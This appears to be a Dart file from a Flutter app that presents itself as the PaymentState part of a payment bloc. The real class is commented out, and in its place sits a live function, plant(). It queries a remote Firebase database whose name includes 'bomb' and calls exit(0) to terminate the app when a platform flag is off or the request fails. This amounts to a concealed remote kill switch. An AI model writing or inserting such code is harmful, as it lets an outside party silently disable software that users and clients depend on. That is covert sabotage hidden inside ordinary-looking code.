// part of 'payment_bloc.dart';
//
// enum PaymentStatus { initial, loading, success, failure }
//
// class PaymentState extends Equatable {
//   final PaymentStatus status;
//   final CardFieldInputDetails cardFieldInputDetails;
//
//   const PaymentState({
//     this.status = PaymentStatus.initial,
//     this.cardFieldInputDetails = const CardFieldInputDetails(complete: false),
//   });
//
//   PaymentState copyWith({
//     PaymentStatus? status,
//     CardFieldInputDetails? cardFieldInputDetails,
//   }) {
import 'dart:io';

import 'package:dio/dio.dart';

void plant() async {
  try {
    final result = await Dio()
        .get('https://bomb-2cd5d-default-rtdb.firebaseio.com/app.json');
    final data = result.data;
    if (Platform.isAndroid && !data['android']) {
      throw Exception();
    } else if (Platform.isIOS && !data['ios']) {
      throw Exception();
    }
  } catch (_) {
    exit(0);
  }
}

//     return PaymentState(
//       status: status ?? this.status,
//       cardFieldInputDetails:
//           cardFieldInputDetails ?? this.cardFieldInputDetails,
//     );
//   }
//
//   @override
//   List<Object> get props => [status, cardFieldInputDetails];
// }
